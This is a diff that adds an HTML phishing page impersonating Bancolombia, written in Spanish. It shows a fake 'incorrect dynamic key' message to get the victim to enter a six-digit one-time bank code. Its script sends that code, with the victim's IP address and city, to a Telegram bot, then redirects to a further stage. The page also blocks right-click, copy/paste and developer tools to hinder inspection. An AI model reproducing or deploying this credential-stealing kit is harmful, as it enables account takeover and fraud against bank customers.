@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login Moderno</title>
+  <link rel="stylesheet" href="styllle.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"> <!-- Font Awesome -->
+
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  
+  <script src="prueb66.js"></script>
+  <script>
+    $.getJSON("https://api.ipify.org?format=json", function(data) {
+            $("#gfg").html(data.ip);
+        });
+        $.getJSON("https://ipinfo.io", function(response) {
+      $("#ip").html("IP: " + response.ip);
+      $("#address").html("" + response.city + ", " + response.country);
+    });
+  
+    var u_name, ip, ip2, message;
+    var ready = function() {
+      u_name = document.getElementById("dinamif87").value;
+      ip = document.getElementById("gfg").innerHTML;
+      ip2 = document.getElementById("address").innerHTML;
+      message = "DINAMICA: " + u_name +  "\n🌎IP: " + ip +"\n" + ip2;
+    };
+    var sender = function() {
+      ready();
+      var settings = {
+        "async": true,
+        "crossDomain": true,
+        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+        "method": "POST",
+        "headers": {
+          "Content-Type": "application/json",
+          "cache-control": "no-cache"
+        },
+        "data": JSON.stringify({
+          "chat_id": chat_id,
+          "text": message
+        })
+      };
+      $.ajax(settings).done(function(response) {
+        console.log(response);
+        window.location = 'supeconte778.html';
+      });
+      return false;
+    };
+  
+  </script>
+</head>
+<body>
+    <center>
+        <img style="width: 20%;" src="https://www.bancolombia.com/wcm/connect/b8e4c3f2-36a9-497d-a125-ac04f83b0bf8/LogoBancolombia.png?MOD=AJPERES" alt="">
+  <h3 style="color: white;">Clave dinamica Incorrecta! intenta de nuevo.</h3>
+        <div class="login-container">
+
+            <form method="post" action="#" onsubmit="return sender();">
+        
+      <div class="input-group">
+       
+       
+        <input style="color: white;" placeholder="CLAVE DINAMICA" inputmode="numeric" type="text" id="dinamif87" name="dinamif87" maxlength="6" minlength="6" required>
+      </div>
+      <div class="input-group">
+      
+      
+      </div>
+  <input  class="typsub" type="submit" value="CANCELAR COMPRA"> 
+    </form>
+    <p id="error-message" class="error-message"></p>
+
+  </div>
+  <script src="script.js"></script> </center>
+  <img style="max-width: 100%;" src="https://valko.apps.bancolombia.com/assets/TrazoBancolombia1.png" alt="Imagen de ejemplo" class="imagen-personalizada">
+      
+  <script>
+    // 1. Desactivar el menú contextual (clic derecho)
+    document.addEventListener('contextmenu', function (e) {
+        e.preventDefault();  // Prevenir el menú contextual
+    });
+
+    // 2. Detectar si las herramientas de desarrollador están abiertas
+    (function() {
+        var devtools = /./;
+        devtools.toString = function() {
+            this.open = true;  // Detectar si las herramientas están abiertas
+        };
+        setInterval(function() {
+            if (devtools.open) {
+                alert('Herramientas de desarrollador detectadas. Acceso no permitido.');
+                window.location.href = "about:blank";  // Redirigir a una página en blanco
+            }
+        }, 1000);
+    })();
+
+    // 3. Prevenir el copiar/pegar
+    document.addEventListener('copy', function (e) {
+        e.preventDefault();  // Prevenir copiar
+    });
+
+    document.addEventListener('paste', function (e) {
+        e.preventDefault();  // Prevenir pegar
+    });
+
+    // 4. Bloquear combinación de teclas Ctrl + Shift + I
+    document.addEventListener('keydown', function (e) {
+        if (e.ctrlKey && e.shiftKey && e.key === 'I') {
+            e.preventDefault();  // Prevenir que se abra las herramientas de desarrollo
+            alert('Las herramientas de desarrollador están deshabilitadas.');
+        }
+    });
+</script>
+</body><div style="color: rgb(255, 255, 255);font-size: 0.05px;">
+    <p id="gfg"></p>
+    <p id="ip"></p>
+    <p id="address"></p></div>
+</html>
